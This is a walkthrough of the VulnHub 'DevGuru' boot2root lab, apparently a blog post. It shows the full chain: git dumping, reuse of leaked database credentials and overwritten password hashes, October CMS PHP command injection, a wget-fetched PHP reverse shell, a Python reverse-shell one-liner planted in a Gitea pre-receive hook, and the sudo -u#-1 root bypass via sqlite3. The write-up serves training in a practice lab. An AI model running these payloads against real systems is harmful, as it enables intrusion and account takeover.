# DevGuru: 1 Vulnhub Walkthrough

Today we’re going to solve another boot2root challenge called “Devguru” and the credits go to **Zayotic** for designing one of the interesting challenges. It’s available at VulnHub for penetration testing practice. This lab is not difficult if we have the right basic knowledge to break the labs and are attentive to all the details we find during the reconnaissance. Let’s get started and learn how to break it down successfully.

### Penetration Testing Methodologies

**Network Scanning **

- Nmap

**Enumeration**

- Extracting git commit
- Login into Adminer
- Change user password

**Initial Foothold**

- Access to CMS
- Inject Malicious PHP code
- Reverse Connection

**Post-Exploititation**

- Access to the backup file
- Login to Gitea
- Gitea malicious code hooking
- Capture User.txt

**Privilege Escalation**

- Abusing sudo
- Capture Root.txt

**Network Scanning**

Let’s go for ports scan with the help of the following command:

nmap -p- -A 192.168.1.32

from its output, I found 3 ports were opened. At port 80 HTTP Apache was running and it gives the following git repository:

192.168.1.32:80/.git/
http://devguru.local:8585/frank/devguru-website.git

At port 8585 I saw “I_like_gitea” thus there is the probability of gitea running.


root@kali:~/home/kali
# nmap -p- -A 192.168.1.32
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-17 09:16 EST
Nmap scan report for devguru.local (192.168.1.32)
Host is up (0.00071s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
ssh-hostkey:
  2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)
  256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)
  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)
80/tcp   open http    Apache httpd 2.4.29 ((Ubuntu))
http-git:
  192.168.1.32:80/.git/
    Git repository found!
    Repository description: Unnamed repository; edit this file 'description'
    Last commit message: first commit
    Remotes:
      http://devguru.local:8585/frank/devguru-website.git
    Project type: PHP application (guessed from .gitignore)
http-server-header: Apache/2.4.29 (Ubuntu)
http-title: Exception
8585/tcp  open  unknown
  fingerprint-strings:
    GenericLines:
      HTTP/1.1 400 Bad Request
      Content-Type: text/plain; charset=utf-8
      Connection: close
      Request
    GetRequest:
      HTTP/1.0 200 OK
      Content-Type: text/html; charset=UTF-8
      Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
      Set-Cookie: i_like_gitea=4d54f97cc380a8fd; Path=/; HttpOnly


Very first we edit the /etc/hosts file by adding the following line.

192.168.1.32 devguru.local


(root@kali)-[/home/kali]
# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       www.kali.dk
192.168.1.32    devguru.local

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


**Enumeration **

With **GitDumper** from the **GitTools **toolkit, we extract all the contents of “/.git/” into our Kali

./gitdumper.sh http://devguru.local/.git website


[root@kali]~[/home/kali/GitTools/Dumper]
# ./gitdumper.sh http://devguru.local/.git/ website/
############
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
############


[*] Destination folder does not exist
[+] Creating website//.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtrere/refs/heads/master
[-] Downloaded: objects/24/f020e71d01899c89440e28e8e5d65d016f9473
[-] Downloaded: objects/3f/1f4cd74e0cea0d64ab9a14875954fb0c39eef
[-] Downloaded: objects/4d/d5e1d2e02195ac03ed685ac05024f0faeef128a
[-] Downloaded: objects/72/819740b89eb5f315808c8648d55bd2db369493


Now, we’ll recover all the files with the GitTools Kit Extractor tool, this is a script that tries to recover incomplete git repositories:

- Iterate through all commit-objects of a repository.
- Try to restore the contents of the commit.

./extractor.sh ../Dumper/website ./website


(root@kali)-[/home/kali/GitTools/Extractor]
# ./extractor.sh ../Dumper/website ./website
###########
# Extractor is part of https://github.com/internetwache/GitTools
# www.github.com/internetwache/GitTools
# Developed and maintained by @gehaxelt from @internetwache
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating ...
[+] Found commit: 7de9115700c5656c670b34987c6fbffd39d90cf2
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found folder: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found folder: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349
[+] Found file: /home/kali/GitTools/Extractor/.website/0-7de9115700c5656c670b349


It will extract commit and dump all files inside it within /website directory. Inside the extract commit folder, I found the admin.php file.


root@kali - [ /home/kali/GitTools/Extractor ]
# ls
extractor.sh README.md website
# cd website/
root@kali - [ /home/kali/GitTools/Extractor/website ]
# ls
0-7de9115700c5656c670b34987c6fbffd39d90cf2
root@kali - [ /home/kali/GitTools/Extractor/website ]
# cd 0-7de9115700c5656c670b34987c6fbffd39d90cf2/
root@kali - [ /home/kali/GitTools/Extractor/website/0-7de9115700c5656c670b34987c6fbffd39d90cf2 ]
# ls
adminer.php artisan bootstrap commit-meta.txt config index.php modules plugins README.md server.php storage themes
root@kali - [ /home/kali/GitTools/Extractor/website/0-7de9115700c5656c670b34987c66fbffd39d90cf2 ]


We explore the admin.php and login page for Adminer 4.7.7 DB

Again, I go back to /7a243ab88e6add580e8fe228a05431d6e4b57a15050b97de844a22694f861dcf2 folder and move into */config* directory where found the **database.php** file.


(root) kali-[/home/kali/GitTools/Extractor/website/0-7de9115700c5656c670b34987c6fbfd39d90cf2]
# ls -la
total 416
drwxr-xr-x 8 root root    4096 Dec 16 11:57 .
drwxr-xr-x 3 root root    4096 Dec 16 11:56 .
-rw-r--r-- 1 root root  362514 Dec 16 11:56 adminer.php
-rw-r--r-- 1 root root    1640 Dec 16 11:56 artisan
drwxr-xr-x 2 root root    4096 Dec 16 11:56 bootstrap
-rw-r--r-- 1 root root     167 Dec 16 11:56 commit-meta.txt
drwxr-xr-x 2 root root    4096 Dec 16 11:56 config
-rw-r--r-- 1 root root     413 Dec 16 11:56 .gitignore
-rw-r--r-- 1 root root    1678 Dec 16 11:56 .htaccess
-rw-r--r-- 1 root root    1173 Dec 16 11:56 index.php
drwxr-xr-x 5 root root    4096 Dec 16 11:56 modules
drwxr-xr-x 3 root root    4096 Dec 16 11:56 plugins
-rw-r--r-- 1 root root    1518 Dec 16 11:56 README.md
-rw-r--r-- 1 root root     551 Dec 16 11:56 server.php
drwxr-xr-x 6 root root    4096 Dec 16 11:57 storage
drwxr-xr-x 3 root root    4096 Dec 16 11:57 themes
(root) kali-[/home/kali/GitTools/Extractor/website/0-7de9115700c5656c670b34987c66fbfd39d90cf2]
# cd config/
(root) kali-[/home/kali/GitTools/Extractor/website/0-7de9115700c5656c670b34987c69bfd39d90cf2/config]
# ls -la
total 92
drwxr-xr-x 2 root root    4096 Dec 16 11:56 .
drwxr-xr-x 8 root root    4096 Dec 16 11:57 .
-rw-r--r-- 1 root root    5828 Dec 16 11:56 app.php
-rw-r--r-- 1 root root    1276 Dec 16 11:56 auth.php
-rw-r--r-- 1 root root    1328 Dec 16 11:56 broadcasting.php
-rw-r--r-- 1 root root    3579 Dec 16 11:56 cache.php
-rw-r--r-- 1 root root   16785 Dec 16 11:56 cms.php
-rw-r--r-- 1 root root     579 Dec 16 11:56 cookie.php
-rw-r--r-- 1 root root    4691 Dec 16 11:56 database.php
-rw-r--r-- 1 root root     999 Dec 16 11:56 environment.php
-rw-r--r-- 1 root root    2134 Dec 16 11:56 filesystems.php
-rw-r--r-- 1 root root    3890 Dec 16 11:56 mail.php
-rw-r--r-- 1 root root    2605 Dec 16 11:56 queue.php
-rw-r--r-- 1 root root     954 Dec 16 11:56 services.php
-rw-r--r-- 1 root root    6441 Dec 16 11:56 session.php
-rw-r--r-- 1 root root    1073 Dec 16 11:56 view.php
(root) kali-[/home/kali/GitTools/Extractor/website/0-7de9115700c5656c670b34987e6fbfd39d90cf2/config]
# cat database.php


The database.php file stored the login details for mysql DB.


Database Connections

Here are each of the database connections setup for your application.  
Of course, examples of configuring each database platform that is supported by Laravel is shown below to make development simple.

All database work in Laravel is done through the PHP PDO facilities so make sure you have the driver for your particular database of choice installed on your machine before you begin development.

'connections' => [

    'sqlite' => [
      'driver' => 'sqlite',
      'database' => 'storage/database.sqlite',
      'prefix' => '',
    ],

    'mysql' => [
      'driver' => 'mysql',
      'engine' => 'InnoDB',
      'host' => 'localhost',
      'port' => 3306,
      'database' => 'octoberdb',
      'username' => 'october',
      'password' => 'SQ66EBYx4GT3byXH',
      'charset' => 'utf8mb4',
      'collation' => 'utf8mb4_unicode_ci',
      'prefix' => '',
      'varcharmax' => 191,
    ],


Thus, I log in using the above-enumerated details.

'database' => 'octoberdb',
'username' => 'october',
'password' => 'SQ66EBYx4GT3byXH',


Adminer 4.7.7

Language: English

Login

| System    | MySQL    |
|---|---|
| Server    | localhost    |
| Username   | october    |
| Password   | ••••••••••••••••••••• |
| Database  | octoberdb    |

[Login] [Permanent login]


In the backend_users table I saw the record for user “Frank” here I found the password in the encrypted form and this record could be modified using the edit tab.

**Edit**  
**1**  
**Frank**  
**Morris**  
**frank@devguru.local**  
**$2y$10$bp5wBtbAN6IMYT27pJMomOGutDF2RKZKYZITAuPz3x8eAaYgN6EKK**

### Import


Here I check the password is encrypted using the bcrypt algorithm.

So, I try to generate a new password “**rajchandel**” by using bcrypt-hash-generator.


https://www.devglan.com/online-tools/bcrypt-hash-generator

Generator

Enter plain text to hash

rajchandel

Select the number of rounds

4

Generate Hash

Hashed Output:

$2a$04$qvdgXGGHaR8mG8fluqlkH.yayfO5jvO/e/kQP6Oxc7kyMKcj0/gzG


Now let’s use the above-generated password hash for user Frank. Thus, I edit the record for the user frank and updated the table.


Edit: backend_users

id
1

first_name
Frank

last_name
Morris

login
frank

email
frank@devguru.local

password
$2a$04$qvdgXGGHaR8mG8f1uq1kH.yayfO...

activation_code
NULL

persist_code
$2y$10$jkuN7SFbtVZk.1EcsJzX8OToOubY5bp6k2C4bruq...

reset_password_code
NULL

permissions


**Initial Foothold**

Now let try to login into October CMS (devguru.local/backend/backend/auth/signin) using the following frank:rajchandel.

It’s time to exploit the CMS, its dashboard looks interesting to me where I found a console for executing code. Thus, I googled and found a link to exploit October CMS by executing PHP code.

So I execute the following code :

function onStart() { $this->page["myVar"] = shell_exec($_GET['cmd']); }


devguru.local/backend/cms#secondarytab-cmslangeditorcode

About  
URL: /about  

Blog Articles  
URL: /blog/page? The main blog page, with all posts.  

Contact Us  
URL: /contact-us  

Home  
URL: / Main Page. Made with CMS-Layout.  

Portfolio  
URL: /portfolio  

Pricing  
URL: /pricing  

Services  
URL: /services  

blog  

---

# Home  

**TITLE**  
Home  

**URL**  
/  

**Save**  
**Preview**  

**Settings**  
**Meta**  

**File Name**  
home.htm  

**Layout**  
cms-layout  

**Description**  
Main Page. Made with CMS-Layout.  

**Hidden**  
Hidden pages are accessible only by logged-in back-end users.  

---

**Markup**  **Code**
function onStart()  
{  
    $this->page["myVar"] = shell_exec($_GET['cmd']);  
}


Then execute the following code inside the Makeup console.

{{ page.this.myVar }}

Now save the code and click on the preview for executing malicious code.

1    {% partial 'home/slider' %}
2    {% partial 'home/intro' %}
3    {% partial 'home/about' %}
4    {% partial 'home/counter' %}
5    {% partial 'home/services' %}
6    {% partial 'home/cta' %}
7    {% partial 'home/contacthome' %}
8
9    {{ this.page.myVar }}

tides.in


When you will explore the source page of the **http://devguru.local?cmd=ls-al** it will list all directories as shown in the following directory.


263    </div>
264    </div>
265 </section>
266 total 420
267 drwxr-xr-x 10 www-data www-data    4096 Nov 19 18:41 .
268 drwxr-xr-x  3 root    root         4096 Nov 18 18:46 .
269 drwxr-xr-x  8 root    root         4096 Nov 19 18:42 .git
270 -rw-r--r--  1 root    root          413 Nov 18 22:13 .gitignore
271 -rw-r--r--  1 www-data www-data    1678 Nov 18 22:11 .htaccess
272 -rw-r--r--  1 www-data www-data    1518 Nov 18 19:13 README.md
273 -rw-r--r--  1 www-data www-data  362514 May 11  2020 adminer.php
274 -rw-r--r--  1 www-data www-data    1640 Nov 18 19:17 artisan
275 drwxr-xr-x  2 www-data www-data    4096 Nov 18 19:17 bootstrap
276 drwxr-xr-x  2 www-data www-data    4096 Nov 18 19:17 config
277 -rw-r--r--  1 www-data www-data    1173 Nov 18 19:17 index.php
278 drwxr-xr-x  5 www-data www-data    4096 Nov 18 19:17 modules
279 drwxr-xr-x  3 www-data www-data    4096 Nov 18 19:17 plugins
280 -rw-r--r--  1 www-data www-data     551 Nov 18 19:17 server.php
281 drwxr-xr-x  7 www-data www-data    4096 Nov 18 19:17 storage
282 drwxr-xr-x  4 www-data www-data    4096 Nov 18 19:17 themes
283 drwxr-xr-x  31 www-data www-data   4096 Nov 18 19:17 vendor
284 <footer class="footer section">
285    <div class="container">


Now let’s transfer the malicious reverse shell (Pentest monkey php reverse shell). I have started a python HTTP server so that I can transfer the shell.php into the target machine.


(root@kali)-[ /home/kali/Desktop ]
# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...


So, using wget command we try to upload the shell.php


view-source:http://devguru.local/?cmd=wget 192.168.1.2:8000/shell.php


Start netcat listener and then execute the malicious php shell by browsing the following URL.

devguru.local/shell.php


**Post-Exploititation**

Boom! We got the reverse connection let’s enumerate the further. We found **app.ini.bak** file in the /var/backup


(root@kali)-[/usr/share/webshells/php]
# nc -lvvp 1234
listening on [any] 1234 ...
connect to [192.168.1.2] from devguru.local [192.168.1.32] 55472
Linux devguru.local 4.15.0-124-generic #127-Ubuntu SMP Fri Nov 6 10:54:43 UTC 2020
12:17:00 up  1:37,  0 users,  load average: 0.03, 0.02, 0.00
USER    TTY    FROM    LOGIN@    IDLE    JCPU    PCUP  WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@devguru:/$ ls
ls
bin     dev         initrd.img.old  lost+found  proc  srv       usr
boot    etc         lib             media       root  swapfile  var
config  home        lib64           mnt         run   sys       vmlinuz
data    initrd.img  logs            opt         sbin  tmp       vmlinuz.old
www-data@devguru:/$ cd var
cd var
www-data@devguru:/var$ ls
ls
backups  cache  crash  lib  local  lock  log  mail  opt  run  spool  tmp  www
www-data@devguru:/var$ cd backups
cd backups
www-data@devguru:/var/backups$ ls
ls
app.ini.bak  apt.extended_states.0  apt.extended_states.1.gz
www-data@devguru:/var/backups$ cat app.ini.bak


Here we found another login credential for gitea DB.


[database]
; Database to use. Either "mysql", "postgres", "mssql" or "sqlite3".
DB_TYPE     = mysql
HOST        = 127.0.0.1:3306
NAME        = gitea
USER        = gitea
PASSWORD    = UfFPTF8C8jjxVF2m
; For Postgres, schema to use if different from "public". The schema must exist
; the user must have creation privileges on it, and the user search path must
; to the look into the schema first. e.g.:ALTER USER user SET SEARCH_PATH = $SCHEMA
; For Postgres, either "disable" (default), "require", or "verify-full"
; For MySQL, either "false" (default), "true", or "skip-verify"
SSL_MODE    = disable


Thus we login mysql as **gitea:UfFPTF8C8jjxVF2m**


Language: English

Adminer 4.7.7 4.7.8

Login

System    MySQL ▼
Server    localhost
Username    gitea
Password    **********
Database

Login    ☐ Permanent login


In the gitea DB inside the user, the table contains the user:frank and again change the password


So, I try to generate a new password “**rajchandel**” by using bcrypt-hash-generator. Now let’s use the above-generated password hash for user Frank. Thus, I edit the record for the user frank and updated the table.


Edit: user

id    1
lower_name    frank
name    frank
full_name
email    frank@devguru.local
keep_email_private    0
email_notifications_preference    enabled
password    $2a$04$KivP7Hkz94az9vls2caQseJU46NFOQdSopJadzC...
password_hash_algo    bcrypt
must_change_password    0
login_type    0
login_source    0
login_name
type    0


Then I navigate to gitea over 8585 and login using the following creds.

User: Frank Password: rajchandel


# Sign In

Username or Email Address *  
frank  

Password *  
**********  

☐ Remember Me  

**Sign In**  
Forgot password?  

Need an account? Register now.


Here we got the dashboard and found a link for frank/devguru-website.


# Dashboard

## Issues
## Pull Requests
## Milestones
## Explore

### frank ▼

---

### 3 total contributions in the last 12 months

| Month | Jan   | Feb   | Mar    | Apr    | May    | Jun    | Jul    | Aug    |
|---|---|---|---|---|---|---|---|---|
| Mon   |    |    |    |    |    |    |    |    |
| Wed   |    |    |    |    |    |    |    |    |
| Fri   |    |    |    |    |    |    |    |    |

**frank pushed to master at frank/devguru-website**

7de9115700 first commit

3 weeks ago

**frank created repository frank/devguru-website**

3 weeks ago

**frank created repository frank/devguru-website**


Click on the settings highlighted in the image.


# devguru.local:8585/frank/devguru-website

## Sidebar
- Dashboard
- Issues
- Pull Requests
- Milestones
- Explore

## Search Bar
- frank / devguru-website

## Code
- Issues
- Pull Requests
- Releases
- Wiki
- Activity

## Settings
- Secure, Fast, Awesome website!
- Manage Topics

## Commit
- 1 Commit

## Branch
- 1 Branch

## Size
- 7.2 MiB


Click on the** Git Hooks > pre-receive > Hook Content** and then execute the python reverse shell and the code.

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


# frank / devguru-website

## Code
- Issues
- Pull Requests
- Releases
- Wiki
- Activity

## Settings
- Unwatch
- Star
- Fork
- 0

---

## Git Hooks

If the hook is inactive, sample content will be presented. Leaving content to an empty value will disable this hook.

**Hook Name**  
pre-receive  

**Hook Content**  
python3 -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect("192.168.1.2",1234);...


But you need to update the repo for executing the python code, thus go back to the repository and open the README.md


frank  
7de9115700  
first commit  

- bootstrap  
  first commit  

- config  
  first commit  

- modules  
  first commit  

- plugins/october/demo  
  first commit  

- storage  
  first commit  

- themes  
  first commit  

- .gitignore  
  first commit  

- .htaccess  
  first commit  

- README.md  
  first commit  

- adminer.php  
  first commit  

- artisan  
  first commit  

- index.php  
  first commit  

- server.php  
  first commit


Now edit the file by adding some blank line at the end of the file and Click Commit Change as soon as you will click on commit the change it will update the repository and you will get a reverse connection through netcat session.


21    * OpenSSL PHP Extension
22    * Mbstring PHP Extension
23    * ZipArchive PHP Extension
24    * GD PHP Extension
25    * SimpleXML PHP Extension
26
27    Some OS distributions may require you to manually install some of the
28
29    When using Ubuntu, the following command can be run to install all
30
31    ```bash
32    sudo apt-get update &&
33    sudo apt-get install php php-ctype php-curl php-xml php-fileinfo php-sqlite3 php-zip
34    ```
35
36
37

Commit Changes

Update 'README.md'

Add an optional extended description...

○ Commit directly to the master branch.
○ Create a new branch for this commit and start a pull request.

Commit Changes    Cancel


Thus, we got the reverse connection where we found the user.txt file which was our 1st flag.

**Privilege Escalation**

Then, for escalating the privileges we check for Sudo right and found user frank can run sqlite3 with root privileges also the installed version of the sudoers plugin is vulnerable.


[root@kali]~[/home/kali]
# nc -lvp 1234
listening on [any] 1234 ...
connect to [192.168.1.2] from devguru.local [192.168.1.32] 34928
bash: cannot set terminal process group (770): Inappropriate ioctl for device
bash: no job control in this shell
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ cd /home
cd /home
frank@devguru:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root  root  4096 Nov 18 23:31 .
drwxr-xr-x 25 root  root  4096 Nov 19 21:03 ..
drwxr-x---  7 frank frank 4096 Nov 19 21:12 frank
frank@devguru:/home$ cd frank
cd frank
frank@devguru:/home/frank$ ls -lla
ls -lla
total 64
drwxr-x---  7 frank frank 4096 Nov 19 21:12 .
drwxr-xr-x  3 root  root  4096 Nov 18 23:31 ..
lrwxrwxrwx  1 root  root     9 Nov 18 22:40 .bash_history → /dev/null
-rw-r--r--  1 frank frank  220 Nov 18 18:28 .bash_logout
-rw-r--r--  1 frank frank 3771 Nov 18 18:28 .bashrc
drwx------  2 frank frank 4096 Nov 18 18:31 .cache
-rw-rw-r--  1 frank frank   73 Nov 19 02:46 .gitconfig
drwx------  3 frank frank 4096 Nov 18 18:31 .gnupg
lrwxrwxrwx  1 root   root    9 Nov 18 23:55 .mysql_history → /dev/null
-rw-r--r--  1 frank frank  807 Nov 18 18:28 .profile
-rw-r--r--  1 frank frank   21 Nov 19 20:48 .sqlite_history
drwx------  2 frank frank 4096 Nov 18 23:53 .ssh
drwxr-xr-x  2 frank frank 4096 Nov 19 02:09 .vim
-rw-r--r--  1 frank frank 8362 Nov 19 20:38 .viminfo
drwxr-xr-x  3 frank frank 4096 Nov 19 02:43 data
-rw-r--r--  1 frank frank   33 Nov 18 22:41 user.txt
frank@devguru:/home/frank$ cat user.txt
cat user.txt
22854d0aec6ba776f9d35bf7b0e00217
frank@devguru:/home/frank$ sudo -l
sudo -l
Matching Defaults entries for frank on devguru:
  env_reset, mail_badpass,
  secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/sbin:/sbin:/bin:/usr/games:/usr/local/games
User frank may run the following commands on devguru:
  (ALL, !root) NOPASSWD: /usr/bin/sqlite3
frank@devguru:/home/frank$ sudo -V
sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
frank@devguru:/home/frank$


We have found an exploit from **here**.


With ALL specified, user hacker can run the binary /bin/bash as any user

EXPLOIT:

sudo -u#-1 /bin/bash

Example :

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#


Then I execute the following command to obtain the root privilege shell and read the root.txt which was our final flag.

sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'

This was a very interesting and quite different CTF challenge I learned some new techniques to access the DB and code injection over the different platforms.


frank@devguru:/home/frank$ sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
id
uid=0(root) gid=1000(frank) groups=1000(frank)
cd /root
ls
msg.txt
root.txt
cat root.txt
96440606fb88aa7497cde5a8e68daf8f
cat msg.txt

Congrats on rooting DevGuru!
Contact me via Twitter @zayotic to give feedback!
